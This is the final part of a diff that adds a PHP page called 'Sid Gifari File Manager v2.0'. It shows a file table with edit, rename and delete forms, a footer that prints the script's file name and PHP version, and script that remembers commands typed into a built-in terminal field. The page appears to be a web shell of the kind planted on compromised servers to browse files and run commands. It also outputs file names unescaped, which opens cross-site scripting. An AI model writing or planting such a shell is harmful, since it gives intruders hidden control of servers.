+                                            <a href="?dir=<?= urlencode(encodePath(CURRENT_PATH)) ?>&edit=<?= urlencode($item['name']) ?>">
+                                                <button style="padding: 4px 8px; font-size: 11px;">Edit</button>
+                                            </a>
+                                            
+                                            <form method="post" style="display: inline;">
+                                                <input type="hidden" name="old" value="<?= $item['name'] ?>">
+                                                <input type="text" name="new" placeholder="New name" style="width: 100px; padding: 4px;">
+                                                <button type="submit" style="padding: 4px 8px; font-size: 11px;">Rename</button>
+                                            </form>
+                                            
+                                            <form method="post" style="display: inline;">
+                                                <input type="hidden" name="delete" value="<?= $item['name'] ?>">
+                                                <button type="submit" class="btn-danger" onclick="return confirm('Delete file <?= addslashes($item['name']) ?>?')" style="padding: 4px 8px;">
+                                                    🗑️
+                                                </button>
+                                            </form>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            <?php endif; ?>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p><strong>Sid Gifari File Manager v2.0</strong></p>
+            <p style="margin-top: 5px; font-size: 10px; color: #888;">
+                File: <code><?= basename(__FILE__) ?></code> | 
+                PHP: <?= phpversion() ?>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const terminalInput = document.querySelector('[name="terminal-text"]');
+            if (terminalInput) {
+                terminalInput.focus();
+                const lastCmd = localStorage.getItem('last_command');
+                if (lastCmd) terminalInput.value = lastCmd;
+            }
+            
+            document.querySelectorAll('form').forEach(form => {
+                if (form.querySelector('[name="terminal-text"]')) {
+                    form.addEventListener('submit', function() {
+                        const cmd = this.querySelector('[name="terminal-text"]').value;
+                        localStorage.setItem('last_command', cmd);
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
